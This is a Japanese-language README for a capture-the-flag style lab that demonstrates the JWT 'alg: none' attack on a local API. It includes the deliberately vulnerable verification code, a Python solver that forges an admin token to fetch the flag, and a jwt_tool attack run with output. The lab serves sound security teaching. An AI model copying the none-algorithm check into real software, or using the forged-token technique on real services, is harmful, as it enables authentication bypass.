# Trial1
アルゴリズムをnoneに変更する攻撃を検証するための環境。

[APIのソースコード](./index.js)

以下のエンドポイントが存在。
- サインインエンドポイント（`/signin`）
  - `username`と`password`を受け取り、該当のユーザーが存在するか確認。
  - `username`と`password`が正しければJWTを発行して返送する。
- flag取得エンドポイント（`/flag`）
  - JWTを受け取り、検証する。
  - 検証が成功し、`username`が`admin`の場合flagを返す。

## 解説
サインインエンドポイント（`/signin`）では認証が成功すると、アルゴリズムがHS256のJWTが発行される。

```js
signed = jwt.sign({
      username: username,
},
      secret, 
      { algorithm: "HS256", expiresIn: "1h" } 
);
```

flag取得エンドポイント（`/flag`）のJWT検証部分に脆弱性が存在。

検証時のアルゴリズムがnoneに指定されているため、アルゴリズムがnoneのJWTが受け入れられる状態になっている。

```js
verified = jwt.verify(
      req.header("Authorization"),
      "",
      { algorithms: ["none"] }
);
```

JWTのペイロードにおける`username`が`admin`の場合にflagが取得できる。

```js
if (verified.username === "admin") {
      res.send(`Congratulations! Here"s your flag: ${FLAG}`);
      return;
}
```

つまり、ペイロードにおける`username`が`admin`かつアルゴリズムがnoneのJWTを作成して`/flag`に送信することでflagが取得できる。

以下の[solver](./solver.py)を実行することで、攻撃を検証可能。

```py
import requests
import json
import jwt
#pyjwt==2.7.0

HOST = "http://localhost:5502"

data = {
    "username": "guest",
    "password": "guest"
}

# /signin
signin_response = requests.post(f"{HOST}/signin", json=data)
print("/signin:", signin_response.text)
encoded_jwt = signin_response.headers['Authorization']
print("encoded jwt:", encoded_jwt)
print("header:", jwt.get_unverified_header(encoded_jwt))

# alg: noneなJWTを作成
none_jwt = jwt.encode({"username": "admin"}, key="", algorithm="none")
print("none jwt:", none_jwt)
print("header:", jwt.get_unverified_header(none_jwt))

# /flag
flag_response = requests.get(f"{HOST}/flag", headers={"Authorization": none_jwt})
print("/flag", flag_response.text)
```

```bash
$ python3 solver.py
/signin: {"message":"ok"}
encoded jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaWF0IjoxNjkzNjY2MzI2LCJleHAiOjE2OTM2Njk5MjZ9.SVX5a3UOG45r-t2mfFHEAx7zbqkqasQBxHuTUESIuis
header: {'alg': 'HS256', 'typ': 'JWT'}
none jwt: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
header: {'alg': 'none', 'typ': 'JWT'}
/flag Congratulations! Here"s your flag: flag{this_is_trial1_flag}
```

## 補足
jwt_toolを用いてもこの攻撃を検証することが可能。

```bash
$ python3 jwt_tool.py -t http://localhost:5502/flag -rh "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaWF0IjoxNjkwNjg0MjU0LCJleHAiOjE2OTA2ODc4NTR9.fEPwTraD9K4FN2QebyNbQxBWjtsW-aGQ6wsF4No6Lhw" -X a -I -pc username -pv admin

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiaWF0IjoxNjkwNjg0MjU0LCJleHAiOjE2OTA2ODc4NTR9.fEPwTraD9K4FN2QebyNbQxBWjtsW-aGQ6wsF4No6Lhw

jwttool_0d87ed4ae607bc4ee00389bded132591 Exploit: "alg":"none" Response Code: 200, 60 bytes
jwttool_0a17f832eb313371de079a55972ddd91 Exploit: "alg":"None" Response Code: 401, 25 bytes
jwttool_84d0dd418379b257dc1cc9e01274c062 Exploit: "alg":"NONE" Response Code: 401, 25 bytes
jwttool_528b9e160b919e9581306842b025aad7 Exploit: "alg":"nOnE" Response Code: 401, 25 bytes
```